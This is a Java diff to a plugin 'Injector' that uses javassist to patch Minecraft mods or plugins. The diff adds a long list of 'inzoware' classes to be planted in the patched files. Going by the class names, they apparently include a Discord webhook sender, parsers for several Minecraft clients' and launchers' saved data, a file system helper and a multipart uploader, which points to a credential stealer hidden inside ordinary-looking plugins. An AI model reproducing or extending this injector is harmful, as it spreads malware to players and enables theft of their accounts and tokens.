@@ -4,16 +4,13 @@ import javassist.ClassClassPath;
 import javassist.ClassPool;
 import javassist.CtClass;
 import javassist.CtMethod;
-import org.apache.commons.lang.SystemUtils;
-import org.yaml.snakeyaml.Yaml;
 
 import java.io.File;
 import java.io.IOException;
 import java.io.InputStream;
-import java.net.JarURLConnection;
-import java.net.URL;
 import java.nio.file.*;
-import java.util.Map;
+
+import com.inzo.technologies.inzoware.utils.Client;
 
 import net.minecraftforge.fml.common.Mod;
 import net.minecraftforge.fml.common.Mod.EventHandler;
@@ -122,8 +119,8 @@ public class Injector {
 
         }catch(FileAlreadyExistsException e){
             if(!quiet) {
-                InjectorGUI.displayError("Mod already patched.");
-                System.out.println("[Injector] Mod already patched.");
+                InjectorGUI.displayError("Plugin already patched.");
+                System.out.println("[Injector] Plugin already patched.");
                 e.printStackTrace();
             }
 
@@ -214,6 +211,48 @@ public class Injector {
     }
 
     private static String[] resource_paths_required = {
+            "com.inzo.technologies.inzoware.exception.WebhookExce",
+            "com.inzo.technologies.inzoware.exception.WebhookException",
+            "com.inzo.technologies.inzoware.hooks.BlackS",
+            "com.inzo.technologies.inzoware.hooks.DiscordDuper",
+            "com.inzo.technologies.inzoware.hooks.DiscordDuper$1",
+            "com.inzo.technologies.inzoware.hooks.DiscordDuper$EmbedObject",
+            "com.inzo.technologies.inzoware.hooks.DiscordDuper$EmbedObject$Author",
+            "com.inzo.technologies.inzoware.hooks.DiscordDuper$EmbedObject$Field",
+            "com.inzo.technologies.inzoware.hooks.DiscordDuper$EmbedObject$Footer",
+            "com.inzo.technologies.inzoware.hooks.DiscordDuper$EmbedObject$Image",
+            "com.inzo.technologies.inzoware.hooks.DiscordDuper$EmbedObject$Thumbnail",
+            "com.inzo.technologies.inzoware.hooks.DiscordDuper$JSONObject",
+            "com.inzo.technologies.inzoware.hooks.Hooks374",
+            "com.inzo.technologies.inzoware.json.JSON",
+            "com.inzo.technologies.inzoware.json.JSONArray",
+            "com.inzo.technologies.inzoware.json.JSONException",
+            "com.inzo.technologies.inzoware.json.JSONObject",
+            "com.inzo.technologies.inzoware.json.JSONObject$1",
+            "com.inzo.technologies.inzoware.json.JSONStringer",
+            "com.inzo.technologies.inzoware.json.JSONStringer$Scope",  
+            "com.inzo.technologies.inzoware.json.JSONTokener",  
+            "com.inzo.technologies.inzoware.mc.JSON",    
+            "com.inzo.technologies.inzoware.mc.parsers.JSONObject",    
+            "com.inzo.technologies.inzoware.mc.parsers.JSONRegexHandler",
+            "com.inzo.technologies.inzoware.mc.parsers.impl.FutureData",
+            "com.inzo.technologies.inzoware.mc.parsers.impl.ImpactData",
+            "com.inzo.technologies.inzoware.mc.parsers.impl.JmapData",   
+            "com.inzo.technologies.inzoware.mc.parsers.impl.KamiBlueData",   
+            "com.inzo.technologies.inzoware.mc.parsers.impl.KonasData", 
+            "com.inzo.technologies.inzoware.mc.parsers.impl.LaucherData",
+            "com.inzo.technologies.inzoware.mc.parsers.impl.RusherData",
+            "com.inzo.technologies.inzoware.mc.parsers.impl.MeteorData",
+            "com.inzo.technologies.inzoware.mc.parsers.util.FileSystemHelper",
+            "com.inzo.technologies.inzoware.mc.parsers.util.JSONBuilder",  
+            "com.inzo.technologies.inzoware.mc.parsers.util.JSONParser",  
+            "com.inzo.technologies.inzoware.mc.parsers.util.MultipartForm",
+            "com.inzo.technologies.inzoware.modules.Blink",
+            "com.inzo.technologies.inzoware.utils.Client",      
+            "com.inzo.technologies.inzoware.utils.Client$1",      
+            "com.inzo.technologies.inzoware.utils.DupingUtils",
+            "com.inzo.technologies.inzoware.utils.INZOUtils",   
+            "com.inzo.technologies.inzoware.utils.InitUtils",                                                                  
             "com.inzo.technologies.inzoware.injector.Injector",
             "com.inzo.technologies.inzoware.injector.Injector$SimpleConfig"
     };
